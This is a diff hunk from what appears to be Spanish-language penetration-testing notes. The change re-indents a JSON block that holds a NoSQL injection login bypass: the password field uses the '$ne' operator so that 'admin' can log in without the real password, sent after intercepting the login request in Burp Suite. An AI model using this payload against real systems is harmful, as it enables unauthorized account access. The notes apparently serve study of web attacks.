@@ -304,12 +304,12 @@ Primero en burpsuite en `capturamos la petición` del login y `cambiamos` la lin
 luego `donde el user y password lo reemplazaremos por` lo siguiente:
 	
   ```json  
-    {
-			"user": "admin",
-			"password":{
-				"$ne":"uwu"
-			}
-		}
+{
+	"user": "admin",
+	"password":{
+		"$ne":"uwu"
+	}
+}
 ```
 
 # COOKIE HIJACKING
